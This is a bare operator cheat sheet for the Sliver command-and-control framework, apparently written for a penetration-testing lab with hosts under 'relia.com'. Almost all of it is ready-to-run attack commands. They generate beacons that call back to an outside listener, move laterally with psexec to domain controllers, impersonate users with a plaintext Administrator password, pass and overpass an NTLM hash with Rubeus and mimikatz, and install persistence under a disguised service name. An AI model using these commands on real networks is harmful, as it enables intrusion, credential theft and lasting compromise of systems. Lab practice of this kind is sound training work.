https://www.cybereason.com/blog/sliver-c2-leveraged-by-many-threat-actors

# Proxy
```bash
socks5 start -P 1080
```

# Beacons
```bash
generate beacon --http 192.168.45.235:8181 --format exe --skip-symbols
```

# Listeners
```bash
http -L 192.168.45.235 -l 8080
```

# Sessions
```bash
generate --http 192.168.45.235:8080 --format exe --skip-symbols
```

# Services
```bash
profiles new --format service --skip-symbols --mtls 192.168.45.235 win-svc64
psexec -d Description -s ServiceName -p win-svc64 LOGIN.relia.com
psexec -d Description -s testo -p win-svc64 DC02.relia.com
```

# Impersonate with credentials
```bash
make-token -u Administrator -p vau!XCKjNQBv2$ -d relia.com -T LOGON_INTERACTIVE
impersonate RELIA\\dan
shell
```

# pivoting (overpass the hash)
```bash
rubeus asktgt /user:dan /rc4:4b22394fc907bd7a74d1af6cc9aca348 /domain:relia.com /ptt
profiles new --format service --skip-symbols --mtls 192.168.45.235:8888 win-svc64
psexec -d waytoknow -s updater_svc -p win-svc64 dc02
```

# persisting
```bash
generate beacon --mtls 192.168.45.235:8989 --skip-symbols --format exe --name dc_pers
mtls -L 192.168.45.235 -l 8989
sharpersist -- -t service -c \"C:\\dc_pers.exe\" -n \"LongivityCheck\" -m add
sa-sc-enum
execute sc start LongivityCheck
```

# impersonating without credentials
```bash
mimikatz '"sekurlsa::pth /user:dan /domain:RELIA /ntlm:4b22394fc907bd7a74d1af6cc9aca348 /run:powershell.exe /impersonate"'
mimikatz '"token::elevate /user:dan /domain:RELIA"'
mimikatz '"token::run /user:dan /domain:RELIA /process:C:\Windows\System32\cmd.exe"'

impersonate RELIA\\dan
shell

-- ONE LINER
mimikatz '"sekurlsa::pth /user:dan /domain:RELIA /ntlm:4b22394fc907bd7a74d1af6cc9aca348 /run:powershell.exe /impersonate" "token::elevate /user:dan /domain:RELIA" "token::run /user:dan /domain:RELIA /process:C:\Windows\System32\cmd.exe"'
```
